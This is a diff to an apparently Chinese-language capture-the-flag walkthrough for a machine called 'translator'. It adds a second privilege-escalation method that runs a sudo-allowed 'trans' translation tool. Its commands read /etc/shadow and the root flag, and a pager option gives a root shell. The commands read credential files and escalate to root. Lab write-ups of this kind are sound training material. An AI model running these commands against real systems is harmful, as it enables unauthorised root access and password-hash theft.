@@ -126,3 +126,18 @@ h87M5364V2343ubvgfy
 root@translator:~# cat /home/ocean/user.txt
 a6765hftgnhvugy473f
 ```
+
+方法二：
+利用trans 进行提权，命令介绍：https://www.jianshu.com/p/da570df21ae8
+这个是google的shell下翻译工具，所以google需要科学上网，我们在后面加上了-x代理，成功读取到shadow文件
+```Css
+sudo /usr/local/bin/trans -i /etc/shadow -x http://192.168.31.11:7890 -no-auto
+
+sudo /usr/local/bin/trans -i /root/root.txt -x http://192.168.31.11:7890 -no-auto
+```
+
+也可以通过如下命令直接提权到root
+
+```css
+sudo /usr/local/bin/trans -pager less -x http://192.168.31.11:7890
+```
